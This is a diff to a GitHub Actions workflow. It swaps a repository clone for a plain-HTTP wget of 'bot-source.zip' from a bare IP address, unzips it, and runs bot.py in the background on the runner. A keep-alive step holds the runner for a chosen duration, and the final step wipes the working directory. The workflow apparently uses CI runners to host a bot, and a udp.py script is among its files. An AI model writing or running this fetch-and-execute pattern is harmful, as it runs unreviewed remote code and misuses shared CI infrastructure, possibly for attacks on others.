@@ -23,7 +23,7 @@ jobs:
         run: |
           echo "Setup environment"
           sudo apt-get update -y
-          sudo apt-get install -y python3 python3-pip git curl wget screen
+          sudo apt-get install -y python3 python3-pip git curl wget screen unzip
           
           curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
           sudo apt-get install -y nodejs
@@ -32,13 +32,19 @@ jobs:
 
       - name: Download source and setup
         run: |
-          echo "Download source"
+          echo "Download source from VPS"
           
           mkdir -p /tmp/bb
           cd /tmp/bb
           
-          git clone https://github.com/Jillianhobaica361/Bb
-          cd Bb
+          wget http://103.218.123.146:8000/bot-source.zip -O source.zip
+          unzip source.zip -d Bb
+          
+          # Vì zip chứa thư mục bot-source, ta cd vào đó
+          cd Bb/bot-source
+          
+          echo "Current directory: $(pwd)"
+          ls -la
           
           # ===== CÀI MODULES NODE.JS =====
           echo "Installing Node.js dependencies..."
@@ -91,15 +97,15 @@ jobs:
           chmod +x udp.py 2>/dev/null || echo "udp.py not found"
           chmod +x setup.sh 2>/dev/null || echo "setup.sh not found"
           
-          echo "Bot.py already exists in repository"
+          echo "Bot.py should exist in repository"
 
       - name: Start bot
         run: |
-          cd /tmp/bb/Bb
+          # Đi đến đúng thư mục chứa bot.py
+          cd /tmp/bb/Bb/bot-source
           
           echo "Starting bot.py"
-          
-          echo "Installed Node.js modules:"
+          echo "Current directory: $(pwd)"
           npm list --depth=0
           
           nohup python3 bot.py > bot.log 2>&1 &
@@ -116,7 +122,8 @@ jobs:
 
       - name: Keep alive
         run: |
-          cd /tmp/bb/Bb
+          # Cũng vào đúng thư mục
+          cd /tmp/bb/Bb/bot-source
           
           DURATION="${{ github.event.inputs.duration }}"
           if [ "$DURATION" = "1h" ]; then TOTAL_MIN=60;
@@ -148,6 +155,7 @@ jobs:
             rm -f /tmp/pid.txt
           fi
           
+          # Xóa toàn bộ thư mục làm việc
           rm -rf /tmp/bb
           
           echo "Instance completed!"
